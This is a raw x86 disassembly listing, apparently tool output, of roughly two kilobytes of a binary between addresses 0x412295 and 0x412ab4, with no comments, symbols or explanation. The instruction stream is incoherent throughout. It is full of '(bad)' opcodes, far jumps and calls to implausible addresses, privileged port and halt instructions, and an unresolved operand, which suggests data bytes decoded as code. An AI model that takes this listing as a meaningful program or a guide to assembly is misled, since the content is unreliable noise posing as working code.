  412295:	push   DWORD PTR [edx]
  412297:	or     BYTE PTR [eax],al
  412299:	jmp    0xff89:0x75c84d03
  4122a0:	dec    ebp
  4122a1:	loopne 0x412273
  4122a3:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  4122a9:	add    BYTE PTR [ebx],dh
  4122ab:	mov    ecx,ebx
  4122ad:	hlt    
  4122ae:	add    ecx,ebx
  4122b0:	enter  0x899c,0x32
  4122b4:	dec    ebp
  4122b5:	add    ecx,eax
  4122b7:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  4122bd:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4122c4:	xor    ecx,ebx
  4122c6:	retf   
  4122c7:	enter  0x4d03,0xc8
  4122cb:	mov    DWORD PTR fs:[eax],ebx
  4122ce:	lea    eax,[eax]
  4122d0:	push   esp
  4122d1:	mov    edi,edi
  4122d3:	fs (bad) 
  4122d5:	(bad)  
  4122d6:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4122dc:	push   0xffffffff
  4122de:	and    bh,bh
  4122e0:	pop    ecx
  4122e1:	inc    eax
  4122e2:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4122e8:	push   0xffffff8b
  4122ea:	pop    ecx
  4122eb:	cld    
  4122ec:	dec    ebp
  4122ed:	lea    ecx,[ecx+0x45ff08ff]
  4122f3:	mov    BYTE PTR [edx+0x1],cl
  4122f6:	add    BYTE PTR [eax],al
  4122f8:	mov    DWORD PTR [ebp+0x8],0x58008d
  4122ff:	dec    DWORD PTR [ebp-0x77]
  412302:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  412309:	cld    
  41230a:	dec    ebp
  41230b:	jne    0x412340
  41230d:	lea    eax,[ebx]
  41230f:	push   eax
  412310:	mov    edi,edi
  412312:	or     BYTE PTR [ecx+0x54a845],cl
  412318:	add    al,ch
  41231a:	(bad)  
  41231b:	sub    esp,ebp
  41231d:	add    BYTE PTR [eax],al
  41231f:	rol    BYTE PTR [eax],0x84
  412322:	inc    ebp
  412323:	add    dh,BYTE PTR [esi+0x0]
  412326:	add    BYTE PTR [ebp-0x73],al
  412329:	mov    ebp,DWORD PTR [esp+edx*4]
  41232c:	inc    DWORD PTR [eax]
  41232e:	lea    ecx,[ebx-0x30074f4]
  412334:	call   0x422eb9
  412339:	add    BYTE PTR [ebp+0x0],cl
  41233c:	jne    0x41237f
  41233e:	dec    DWORD PTR [ebx-0x76210314]
  412344:	dec    ebp
  412345:	add    DWORD PTR [ebp+0x0],esi
  412348:	(bad)  
  412349:	xchg   ebp,eax
  41234a:	loopne 0x41234b
  41234c:	inc    eax
  41234d:	inc    DWORD PTR [eax]
  41234f:	mov    ecx,DWORD PTR [ebp-0x4]
  412352:	xor    edx,DWORD PTR [edx+0x7201b8]
  412358:	add    BYTE PTR [edx],dl
  41235a:	enter  0x4d90,0x0
  41235e:	mov    eax,DWORD PTR [eax]
  412360:	hlt    
  412361:	add    al,0xa5
  412363:	mov    al,0xff
  412365:	add    bh,bh
  412367:	add    BYTE PTR [ebx],dh
  412369:	inc    DWORD PTR [ebx]
  41236b:	sbb    al,0x89
  41236d:	jne    0x412347
  41236f:	mov    esp,DWORD PTR [ecx+0x4500fc]
  412375:	mov    eax,DWORD PTR [ebp-0xff0048]
  41237b:	mov    DWORD PTR [eax-0x70],0xee58ed89
  412382:	inc    DWORD PTR [ebp-0x75]
  412385:	fisttp QWORD PTR [eax+eiz*8]
  412388:	test   DWORD PTR [esi-0x1],esp
  41238b:	inc    ebp
  41238c:	(bad)  
  41238d:	aas    
  41238e:	inc    ebp
  41238f:	(bad)  
  412390:	lea    edi,[esp+eiz*2-0x1]
  412394:	inc    edi
  412396:	mov    DWORD PTR ds:0x8000c7a0,edi
  41239c:	mov    ebp,esi
  41239e:	cld    
  41239f:	in     al,0x8d
  4123a1:	inc    ebp
  4123a2:	jmp    eax
  4123a4:	(bad)  
  4123a5:	fisttp WORD PTR [eax+0x8801c7]
  4123ab:	jecxz  0x4123f2
  4123ad:	out    dx,al
  4123ae:	inc    DWORD PTR [ebp-0x4]
  4123b1:	out    0x8d,eax
  4123b3:	aas    
  4123b4:	inc    edi
  4123b6:	jmp    FWORD PTR [eax-0x78]
  4123b9:	inc    DWORD PTR [ecx]
  4123bb:	mov    DWORD PTR [eax],0xc7a83d
  4123c1:	ins    BYTE PTR es:[edi],dx
  4123c2:	test   edi,edi
  4123c4:	pandn  mm0,mm5
  4123c7:	aas    
  4123c8:	add    bh,al
  4123ca:	mov    esi,DWORD PTR [eax-0x4]
  4123cd:	inc    DWORD PTR [eax+0xdf01e0]
  4123d3:	(bad)  
  4123d4:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4123d8:	mov    ebp,ebx
  4123da:	xchg   esp,eax
  4123db:	fild   DWORD PTR [eax]
  4123dd:	(bad)  
  4123de:	mov    edi,DWORD PTR [eax+0x3]
  4123e1:	(bad)  
  4123e2:	cmp    al,0xe7
  4123e4:	dec    ebp
  4123e5:	leave  
  4123e6:	mov    ebp,eax
  4123e8:	fsubr  DWORD PTR [ecx]
  4123ea:	add    BYTE PTR [eax],al
  4123ec:	lea    ecx,[ebx-0x7f0003b4]
  4123f2:	push   edx
  4123f3:	add    DWORD PTR [ebp+0x0],edx
  4123f6:	mov    esi,DWORD PTR [eax]
  4123f8:	mov    WORD PTR [ebx-0x7a750000],?
  4123fe:	add    esi,DWORD PTR [ebp-0x78]
  412401:	mov    eax,DWORD PTR [eax]
  412403:	cld    
  412404:	push   0x7d
  412406:	dec    DWORD PTR [ebx+0xd88c]
  41240c:	push   edx
  41240d:	mov    edx,DWORD PTR [ecx-0x4]
  412410:	call   DWORD PTR [eax+0x7d01fc]
  412416:	mov    ebx,edx
  412418:	cld    
  412419:	add    BYTE PTR [eax+0x560150],dl
  41241f:	test   DWORD PTR [ebp+0x75],eax
  412422:	in     al,0x8b
  412424:	in     al,dx
  412425:	cld    
  412426:	(bad)  
  412427:	jge    0x4123bd
  412429:	mov    esp,ebx
  41242b:	fsub   st,st(7)
  41242d:	add    bh,al
  41242f:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  412435:	add    edi,edi
  412437:	add    bh,bh
  412439:	mov    eax,0x50d800ed
  41243e:	inc    ebp
  41243f:	push   esi
  412440:	fisttp WORD PTR [ebx+0x4dc7f43f]
  412446:	test   BYTE PTR [ebx],dh
  412448:	fadd   DWORD PTR ds:0x4572c2
  41244e:	jmp    0x412411
  412450:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  412457:	inc    esi
  412458:	jo     0x41245a
  41245a:	test   edi,eax
  41245c:	jmp    esp
  41245e:	inc    DWORD PTR [eax]
  412460:	in     eax,dx
  412461:	add    al,bl
  412463:	jne    0x4123ea
  412465:	mov    edi,edi
  412467:	cld    
  412468:	inc    DWORD PTR [ebp-0x12]
  41246b:	mov    esp,esp
  41246d:	mov    ah,0x85
  41246f:	add    bh,bh
  412471:	call   0x1194d75
  412476:	ret    0x858b
  412479:	cld    
  41247a:	inc    DWORD PTR [eax+0xe301ff]
  412480:	out    dx,al
  412481:	xor    BYTE PTR [ebp-0xff00cf],al
  412487:	mov    ebx,ebp
  412489:	cld    
  41248a:	jo     0x412415
  41248c:	or     DWORD PTR [ecx],eax
  41248e:	add    BYTE PTR [eax],al
  412490:	push   eax
  412491:	add    DWORD PTR [ebp+0x45],eax
  412494:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  41249a:	dec    DWORD PTR [ebx-0x3fda0318]
  4124a0:	add    BYTE PTR [ebp-0xbf0040],dl
  4124a6:	inc    ebp
  4124a7:	or     BYTE PTR [ebx-0x4faf0400],0x45
  4124ae:	add    DWORD PTR [ebx+0x459c00],ecx
  4124b4:	mov    edi,edi
  4124b6:	mov    eax,0xe80800ff
  4124bb:	inc    ebp
  4124bc:	sub    BYTE PTR [ebx-0x47000400],cl
  4124c2:	add    al,0x1
  4124c4:	rol    BYTE PTR [eax],0x1e
  4124c7:	jne    0x41250e
  4124c9:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4124cf:	inc    DWORD PTR [ecx]
  4124d1:	call   0x864cd6
  4124d6:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4124dc:	call   0x414ce2
  4124e1:	xor    bh,bh
  4124e3:	push   edi
  4124e4:	adc    BYTE PTR [ebx-0x747423bb],al
  4124ea:	loopne 0x4124c8
  4124ec:	ret    
  4124ed:	loopne 0x41248b
  4124ef:	xor    DWORD PTR [edx],0x31
  4124f2:	cmp    edi,edi
  4124f4:	bswap  esp
  4124f6:	rol    BYTE PTR gs:[eax],0x5
  4124fa:	jmp    0x12c2644
  4124ff:	mov    eax,DWORD PTR [ebp-0x4]
  412502:	add    BYTE PTR [eax+0xff0100],bh
  412508:	cld    
  412509:	jne    0x412588
  41250b:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  412511:	push   ss
  412512:	add    DWORD PTR [eax],eax
  412514:	add    BYTE PTR [eax+0x7f],dl
  412517:	inc    ebp
  412518:	add    BYTE PTR [ebx+0x459850],cl
  41251e:	mov    edi,edi
  412520:	test   al,0xff
  412522:	add    BYTE PTR [eax],cl
  412524:	inc    DWORD PTR [ebp-0x18]
  412527:	jmp    DWORD PTR ds:0x4d7d00dc
  41252d:	adc    BYTE PTR [ebx+0x459cb9],cl
  412533:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  412539:	pushf  
  41253a:	mov    eax,0x30132
  41253f:	lea    esi,[ebp+0x2c]
  412542:	xor    edi,edi
  412544:	(bad)  
  412545:	call   0x1404cb2
  41254a:	call   0x1354dda
  41254f:	jne    0x4124dc
  412551:	xor    edi,esp
  412553:	add    eax,DWORD PTR [eax+0xc018d]
  412559:	push   DWORD PTR [eax]
  41255b:	call   0xca4cb7
  412560:	int3   
  412561:	inc    DWORD PTR [ebp-0x14]
  412564:	mov    ecx,DWORD PTR [ebp-0x28]
  412567:	xor    eax,DWORD PTR [eax]
  412569:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  41256f:	(bad)  
  412570:	xchg   ebp,eax
  412571:	in     al,0xff
  412573:	add    bh,bh
  412575:	add    BYTE PTR [ebp+0x45],dl
  412578:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  41257e:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  412585:	mov    edi,edi
  412587:	or     BYTE PTR [eax],cl
  412589:	inc    ebp
  41258a:	test   DWORD PTR gs:[eax],eax
  41258d:	je     0x4125d4
  41258f:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  412595:	xor    edx,DWORD PTR [eax-0x73]
  412598:	push   ebp
  412599:	or     BYTE PTR [ebp+0x21007572],al
  41259f:	inc    ebp
  4125a0:	in     al,dx
  4125a1:	mov    ebp,DWORD PTR [eax]
  4125a3:	mov    esp,0x648bc345
  4125a8:	fmul   st,st(5)
  4125aa:	add    BYTE PTR [ebx],ch
  4125ac:	mov    eax,DWORD PTR [ebx]
  4125ae:	cld    
  4125af:	loopne 0x412571
  4125b1:	inc    ebp
  4125b2:	push   ebp
  4125b3:	cmp    ebp,eax
  4125b5:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  4125bc:	cld    
  4125bd:	fadd   DWORD PTR [eax+0x3b014d]
  4125c3:	jne    0x4125f5
  4125c5:	push   0xf8898557
  4125ca:	in     al,dx
  4125cb:	jne    0x412612
  4125cd:	lea    eax,[ebx+0x72e8dcc8]
  4125d3:	das    
  4125d4:	mov    eax,DWORD PTR [eax]
  4125d6:	mov    esp,0x33eb7545
  4125db:	mov    edi,DWORD PTR [edi+0x4572bc]
  4125e1:	xor    eax,edi
  4125e3:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  4125ed:	rcl    BYTE PTR [eax-0x40],1
  4125f0:	inc    ebp
  4125f1:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4125f9:	inc    ebp
  4125fa:	xchg   ebp,eax
  4125fb:	ud0    ebp,DWORD PTR [ebx]
  4125fe:	inc    DWORD PTR [eax]
  412600:	retf   
  412601:	jbe    0x412603
  412603:	mov    dl,BYTE PTR [eax-0x80]
  412606:	push   ebp
  412607:	pop    ds
  412608:	mov    ecx,DWORD PTR [esp+esi*8]
  41260b:	inc    eax
  41260c:	retf   
  41260d:	inc    ebp
  41260e:	iret   
  41260f:	jb     0x4125d9
  412611:	mov    eax,DWORD PTR [edi]
  412613:	enter  0x4545,0x1
  412617:	xor    DWORD PTR [eax],eax
  412619:	pushf  
  41261a:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  412620:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  412627:	dec    ebp
  412628:	add    BYTE PTR [ebx],dh
  41262a:	inc    ebp
  41262b:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  412631:	xor    dl,BYTE PTR [edx]
  412633:	add    eax,DWORD PTR [ebp-0x77]
  412636:	mov    eax,esp
  412638:	fmul   DWORD PTR [ebp-0x3d]
  41263b:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  412642:	mov    DWORD PTR [ebp-0x28],eax
  412645:	rol    DWORD PTR [ebp-0x64],1
  412648:	xor    eax,edi
  41264a:	mov    ecx,0xff858db0
  41264f:	clc    
  412650:	enter  0x4d45,0x32
  412654:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  41265b:	test   esi,edi
  41265d:	clc    
  41265e:	inc    DWORD PTR [ebp+0x45]
  412661:	cmp    al,0x8b
  412663:	pushf  
  412664:	or     bh,al
  412666:	enter  0x16a8,0x85
  41266a:	xor    eax,edi
  41266c:	pushf  
  41266d:	inc    ebp
  41266e:	(bad)  
  41266f:	ds cld 
  412671:	pushf  
  412672:	inc    ebp
  412673:	mov    edx,DWORD PTR [eax-0x28]
  412676:	lock push ebp
  412678:	add    BYTE PTR [ebx],dh
  41267a:	mov    DWORD PTR [ebx],eax
  41267c:	sar    BYTE PTR [ebx],1
  41267e:	adc    BYTE PTR [edi],cl
  412680:	dec    ebp
  412681:	adc    al,0x8b
  412683:	add    al,dl
  412685:	jmp    0x1022855
  41268a:	jb     0x4126d9
  41268c:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  412692:	xor    ecx,DWORD PTR [ebp+0x3b]
  412695:	xor    ecx,DWORD PTR [edi]
  412697:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  41269b:	(bad)  
  41269d:	clc    
  41269e:	enter  0x8400,0x8b
  4126a2:	pop    es
  4126a3:	mov    al,0x0
  4126a5:	push   ebp
  4126a6:	push   cs
  4126a7:	xor    ecx,eax
  4126a9:	xor    esp,ecx
  4126ab:	add    ebp,DWORD PTR [eax]
  4126ad:	add    esi,DWORD PTR [eax]
  4126af:	(bad)  
  4126b1:	retf   0x55c8
  4126b4:	repnz mov eax,DWORD PTR [ebp-0x10]
  4126b8:	(bad)  
  4126b9:	cli    
  4126ba:	fdivr  st,st(1)
  4126bc:	test   DWORD PTR [eax+edi*8],ecx
  4126bf:	dec    ebp
  4126c0:	inc    ebp
  4126c1:	xor    edi,DWORD PTR [eax-0x7167afd]
  4126c7:	add    BYTE PTR [ebp+0x0],al
  4126ca:	mov    ecx,DWORD PTR [ebp-0x28]
  4126cd:	mov    ecx,ebx
  4126cf:	clc    
  4126d0:	jne    0x41269d
  4126d2:	mov    esi,0xd672d3
  4126d7:	into   
  4126d8:	into   
  4126d9:	scas   eax,DWORD PTR es:[edi]
  4126da:	dec    ebp
  4126db:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4126e1:	sub    ecx,esi
  4126e3:	cmp    ecx,DWORD PTR [ebp+0x77]
  4126e6:	(bad)  
  4126e7:	mov    edi,eax
  4126e9:	mov    al,0x85
  4126eb:	mov    eax,edi
  4126ed:	add    BYTE PTR [ebp-0x75],al
  4126f0:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4126f7:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4126fd:	(bad)  
  4126ff:	retf   0x559c
  412702:	(bad)  
  412703:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  41270a:	inc    ebp
  41270b:	add    eax,0xeb9c4d3f
  412710:	(bad)  
  412711:	mov    ecx,esp
  412713:	lods   al,BYTE PTR ds:[esi]
  412714:	test   DWORD PTR [ebp-0x8],edx
  412717:	xor    ecx,DWORD PTR [ebp+0x33]
  41271a:	mov    eax,DWORD PTR [ebx]
  41271c:	lock add ecx,ebx
  41271f:	bswap  esi
  412721:	retf   0x55d1
  412724:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  41272a:	jmp    0x412725
  41272c:	add    BYTE PTR ds:0xebc44d8b,al
  412732:	push   ebp
  412733:	mov    ebp,DWORD PTR [ebx]
  412735:	test   al,0x8b
  412737:	push   ebp
  412738:	clc    
  412739:	xor    ecx,ebx
  41273b:	xor    ecx,esi
  41273d:	add    edx,ecx
  41273f:	add    eax,DWORD PTR [edx+0xca010f]
  412745:	push   ebp
  412746:	dec    ebp
  412747:	mov    ecx,DWORD PTR [ebx-0x34050710]
  41274d:	stc    
  41274e:	rol    DWORD PTR ds:0xebce4dd6,cl
  412754:	scas   eax,DWORD PTR es:[edi]
  412755:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  41275b:	xor    ebp,DWORD PTR [ebx]
  41275d:	xor    edi,DWORD PTR [ebx]
  41275f:	add    esi,DWORD PTR [edi+0x3]
  412762:	mov    ecx,DWORD PTR [edi]
  412764:	clc    
  412765:	retf   0x55cb
  412768:	into   
  412769:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  412770:	mov    eax,0x3376554d
  412775:	mov    esi,DWORD PTR [ebx]
  412777:	int3   
  412778:	add    edx,DWORD PTR [ebp+0x3]
  41277b:	xor    ecx,DWORD PTR [edi]
  41277d:	xor    ecx,edx
  41277f:	add    edx,DWORD PTR [ebp+0x3]
  412782:	mov    ecx,DWORD PTR [edi]
  412784:	lock retf 0x4dfa
  412788:	stc    
  412789:	mov    ecx,DWORD PTR [eax]
  41278b:	or     BYTE PTR [ebp+0x4d],cl
  41278e:	jmp    0x105281e
  412793:	dec    ebp
  412794:	dec    ebp
  412795:	(bad)  
  412796:	mov    ebx,esp
  412798:	clc    
  412799:	test   ebx,ecx
  41279b:	clc    
  41279c:	ror    DWORD PTR [ebp-0x2a],cl
  41279f:	mov    esi,ecx
  4127a1:	call   0x33cc6d55
  4127a6:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  4127ad:	retf   
  4127ae:	ja     0x41277e
  4127b0:	mov    ebp,DWORD PTR [eax-0x48]
  4127b3:	dec    ebp
  4127b4:	xor    ecx,DWORD PTR [di+0x3]
  4127b8:	mov    esp,esp
  4127ba:	clc    
  4127bb:	push   ebp
  4127bc:	retf   
  4127bd:	mov    dl,bl
  4127bf:	adc    esi,edx
  4127c1:	jb     0x412791
  4127c3:	add    BYTE PTR [edi-0x3b7474b3],ch
  4127c9:	call   0x4d6cf34b
  4127ce:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4127d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d5:	pushf  
  4127d6:	inc    ebp
  4127d7:	xor    cl,BYTE PTR [ebp-0x78]
  4127da:	mov    edx,edi
  4127dc:	clc    
  4127dd:	dec    ebp
  4127de:	retf   
  4127df:	mov    edx,ebx
  4127e1:	call   0x560ffbbc
  4127e6:	scas   eax,DWORD PTR es:[edi]
  4127e7:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4127ed:	pushf  
  4127ee:	sub    esi,DWORD PTR [edx]
  4127f0:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4127f6:	lods   al,BYTE PTR ds:[esi]
  4127f7:	xor    esp,DWORD PTR [ebx]
  4127f9:	add    ecx,DWORD PTR [ebp-0x1c]
  4127fc:	mov    edi,DWORD PTR [ebp-0x8]
  4127ff:	mov    bl,cl
  412801:	cmp    dl,bl
  412803:	jb     0x4127d3
  412805:	add    dh,dl
  412807:	dec    ebp
  412808:	scas   eax,DWORD PTR es:[edi]
  412809:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  41280f:	shr    DWORD PTR [ebx],cl
  412811:	into   
  412812:	cmp    edx,esi
  412814:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  41281a:	dec    ebp
  41281b:	dec    ebp
  41281c:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  412822:	retf   
  412823:	xor    edx,esi
  412825:	add    ecx,esi
  412827:	imul   ecx,edx
  41282a:	mov    DWORD PTR [ebp+0x8],edx
  41282d:	xor    ecx,DWORD PTR [ebp+0x2b]
  412830:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  412836:	add    esi,DWORD PTR [ebx]
  412838:	mov    ah,0x3
  41283a:	inc    ebp
  41283b:	rdtsc  
  41283d:	xlat   BYTE PTR ds:[ebx]
  41283e:	pushf  
  41283f:	jge    0x4127ca
  412841:	xor    ebx,eax
  412843:	sub    eax,DWORD PTR [ebp-0x73]
  412846:	(bad)  
  412847:	cmp    al,al
  412849:	jb     0x4127d0
  41284b:	add    al,bh
  41284d:	ror    DWORD PTR [ebp-0x7a],1
  412850:	xor    edi,edi
  412852:	add    edi,edi
  412854:	jmp    0x4128a3
  412856:	mov    ecx,DWORD PTR [ebx-0x34341324]
  41285c:	dec    ebp
  41285d:	into   
  41285e:	mov    ebp,DWORD PTR [edi-0x23737428]
  412864:	pushf  
  412865:	shl    DWORD PTR [edx],cl
  412867:	retf   0x5588
  41286a:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412870:	add    eax,DWORD PTR [eax]
  412872:	in     al,0x4d
  412874:	push   ebp
  412875:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  41287b:	fs add ch,cl
  41287e:	dec    ebp
  41287f:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  412885:	dec    ebp
  412886:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  41288c:	jge    0x41285c
  41288e:	mov    BYTE PTR [edi+0xf723b3a],ch
  412894:	add    cl,dh
  412896:	dec    ebp
  412897:	dec    DWORD PTR [ebx-0x2c032375]
  41289d:	adc    BYTE PTR [ebp+0x1],0x8b
  4128a1:	add    al,bl
  4128a3:	jge    0x412831
  4128a5:	push   0xffffff9c
  4128a7:	push   0x8b3032
  4128ac:	shl    BYTE PTR [ebp+0x55],0x6a
  4128b0:	xor    edi,edi
  4128b2:	xor    edx,DWORD PTR [ebx+eax*1]
  4128b5:	inc    ebp
  4128b6:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4128bc:	dec    ebp
  4128bd:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4128c3:	jbe    0x412850
  4128c5:	mov    ebp,esp
  4128c7:	ror    bl,1
  4128c9:	enter  0x14ce,0xaf
  4128cd:	dec    DWORD PTR [ebx-0x2cef17f8]
  4128d3:	push   ebp
  4128d4:	retf   0x5540
  4128d7:	push   ebp
  4128d8:	mov    esi,DWORD PTR [edx-0x1c]
  4128db:	mov    edx,ebx
  4128dd:	cld    
  4128de:	(bad)  
  4128df:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4128e6:	sti    
  4128e7:	add    dh,cl
  4128e9:	push   0xffffff94
  4128eb:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  4128f2:	bswap  esp
  4128f4:	pop    esi
  4128f5:	inc    ebp
  4128f6:	dec    DWORD PTR [ecx+0x45e8c88b]
  4128fc:	push   ebp
  4128fd:	xor    esi,DWORD PTR [ebx]
  4128ff:	mov    DWORD PTR [ebx],0xcac00f9c
  412905:	aas    
  412906:	push   ebp
  412907:	inc    ebp
  412908:	xor    ecx,eax
  41290a:	add    ecx,eax
  41290c:	mov    eax,DWORD PTR [ebx]
  41290e:	(bad)  
  41290f:	jmp    0x41289d
  412911:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  412918:	les    edi,FWORD PTR [esi-0xeccefb3]
  41291e:	mov    edx,0xff378d80
  412923:	mov    dh,0xd1
  412925:	cmp    edx,DWORD PTR [ebp+0xf]
  412928:	mov    eax,DWORD PTR [edx-0x20]
  41292b:	add    BYTE PTR [ebp-0x75],bh
  41292e:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  412935:	pushf  
  412936:	retf   0x8632
  412939:	cmp    ebp,0x8
  41293c:	call   ebx
  41293e:	inc    ebp
  41293f:	inc    ebp
  412940:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  412946:	mov    esi,DWORD PTR [ecx]
  412948:	enter  0x49c,0xc7
  41294c:	add    al,al
  41294e:	add    bl,al
  412950:	(bad)  
  412951:	clc    
  412952:	enter  0x45,0x31
  412956:	push   eax
  412957:	pushf  
  412958:	mov    edi,eax
  41295a:	int3   
  41295b:	or     al,al
  41295d:	test   DWORD PTR [edi],edi
  41295f:	clc    
  412960:	gs inc ebp
  412962:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  412968:	push   ss
  412969:	xor    ecx,DWORD PTR [ebp+0x3]
  41296c:	sub    edx,DWORD PTR [ecx-0x76]
  41296f:	dec    ebp
  412970:	add    DWORD PTR [ebx+0x88d845],ecx
  412976:	mov    esi,DWORD PTR [ebx]
  412978:	or     BYTE PTR [ebx],al
  41297a:	cmp    edx,DWORD PTR [ecx-0x38]
  41297d:	dec    ebp
  41297e:	out    dx,eax
  41297f:	xor    eax,DWORD PTR [ebp+0x3]
  412982:	mov    edx,DWORD PTR [ecx-0x28]
  412985:	dec    ebp
  412986:	add    BYTE PTR [ebx],dh
  412988:	push   0x518003
  41298d:	push   eax
  41298e:	add    BYTE PTR [ebx-0x300748b],cl
  412994:	sbb    BYTE PTR [ebp+0x45],cl
  412997:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  41299d:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4129a3:	dec    ebp
  4129a4:	inc    ebp
  4129a5:	xor    ecx,eax
  4129a7:	add    ecx,eax
  4129a9:	push   ecx
  4129aa:	(bad)  
  4129ab:	dec    ebp
  4129ac:	mov    al,ds:0xc5e03dff
  4129b1:	retf   
  4129b2:	(bad)  
  4129b3:	into   
  4129b4:	sub    bh,bh
  4129b6:	dec    esp
  4129b7:	adc    al,0x9c
  4129b9:	inc    ebp
  4129ba:	push   ebp
  4129bb:	test   DWORD PTR [edi],ecx
  4129bd:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  4129c4:	jmp    0xc9ba38d8
  4129c9:	add    cl,dl
  4129cb:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4129d5:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4129db:	rol    BYTE PTR [eax],0x55
  4129de:	clc    
  4129df:	fs jb  0x4129e9
  4129e2:	mov    eax,DWORD PTR [ebp-0x30]
  4129e5:	xor    al,0x40
  4129e7:	sub    al,0xc7
  4129e9:	mov    ah,ch
  4129eb:	add    DWORD PTR [ebp+0x4534f845],eax
  4129f1:	sub    al,0x86
  4129f3:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4129fa:	mov    ch,0xff
  4129fc:	clc    
  4129fd:	add    DWORD PTR [ebp+0x60],0x3d
  412a01:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  412a08:	inc    ebp
  412a09:	dec    DWORD PTR [ebx-0x341ff701]
  412a0f:	test   esi,ecx
  412a11:	dec    DWORD PTR [ebx-0x7f8a3301]
  412a17:	push   eax
  412a18:	add    DWORD PTR [ebp+0x0],eax
  412a1b:	dec    ebx
  412a1d:	or     al,0xce
  412a1f:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  412a26:	into   
  412a27:	add    BYTE PTR [ebx-0x34ff1400],cl
  412a2d:	mov    esi,ecx
  412a2f:	sar    bh,0x45
  412a32:	adc    al,0x8b
  412a34:	clc    
  412a35:	fadd   DWORD PTR [ebp+0x0]
  412a38:	mov    ebp,DWORD PTR [edx+0x8]
  412a3b:	push   edi
  412a3c:	adc    BYTE PTR [eax+0x1],0x83
  412a40:	add    al,al
  412a42:	retf   
  412a43:	mov    ecx,esi
  412a45:	cld    
  412a46:	mov    eax,DWORD PTR [eax+0xcb01cc]
  412a4c:	into   
  412a4d:	add    BYTE PTR [ebx+0x756aec00],cl
  412a53:	jne    0x412a88
  412a55:	inc    DWORD PTR [ebx]
  412a57:	rcl    BYTE PTR [ecx+0x50],1
  412a5a:	push   eax
  412a5b:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  412a61:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  412a68:	sar    bh,0x84
  412a6b:	or     BYTE PTR [ebx],al
  412a6d:	push   eax
  412a6e:	add    BYTE PTR [ebx+0x4532c845],cl
  412a74:	pushf  
  412a75:	xor    edi,eax
  412a77:	pushf  
  412a78:	mov    ah,0x89
  412a7a:	test   eax,ebp
  412a7c:	clc    
  412a7d:	inc    ebp
  412a7e:	inc    ebp
  412a7f:	mov    DWORD PTR [eax+eax*8],esi
  412a82:	sub    al,0x30
  412a84:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  412a8b:	dec    ebp
  412a8c:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a90:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  412a96:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a9a:	or     DWORD PTR [ecx+0x45ff085c],0x0
  412aa1:	shl    DWORD PTR [ebp-0x380064],1
  412aa7:	int3   
  412aa8:	lea    eax,[ebp+0x45fff860]
  412aae:	push   eax
  412aaf:	xor    dh,BYTE PTR [ebp-0x64]
  412ab2:	(bad)  
  412ab3:	(bad)  
  412ab4:	pop    esp
